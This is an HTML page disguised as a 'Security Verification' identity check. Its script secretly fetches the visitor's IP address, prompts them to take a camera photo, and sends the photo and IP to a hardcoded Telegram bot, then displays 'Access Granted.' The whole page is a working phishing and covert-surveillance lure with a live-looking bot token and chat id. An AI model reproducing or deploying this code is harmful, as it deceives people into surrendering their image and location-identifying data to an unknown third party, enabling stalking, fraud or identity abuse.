<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Security Verification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 80px;
    }
    h2 {
      color: #222;
    }
    button {
      padding: 12px 25px;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
    }
    #status {
      margin-top: 20px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <h2>Security Verification Required</h2>
  <p>For your safety, please confirm your identity below.</p>
  <button onclick="startVerification()">Start Verification</button>

  <input type="file" accept="image/*" capture="environment" id="cam" style="display: none;">
  <p id="status"></p>

  <script>
    let userIP = "Unknown IP";

    // گرفتن IP کاربر با API ساده
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => userIP = data.ip)
      .catch(() => userIP = "IP not found");

    function startVerification() {
      document.getElementById('cam').click();
    }

    document.getElementById("cam").addEventListener("change", function() {
      const file = this.files[0];
      if (!file) return;

      document.getElementById("status").innerText = "Verifying...";

      const formData = new FormData();
      formData.append("chat_id", "1196450049");
      formData.append("caption", "New photo captured.\nIP: " + userIP);
      formData.append("photo", file);

      fetch("https://api.telegram.org/bot7122462118:AAGdnDrTtLv6kYzROabnkaT-_9W54WJeXBQ/sendPhoto", {
        method: "POST",
        body: formData
      })
      .then(res => {
        if (res.ok) {
          document.getElementById("status").innerText = "Access Granted.";
        } else {
          document.getElementById("status").innerText = "Verification failed.";
        }
      })
      .catch(err => {
        document.getElementById("status").innerText = "Error: " + err.message;
      });
    });
  </script>
</body>
</html>
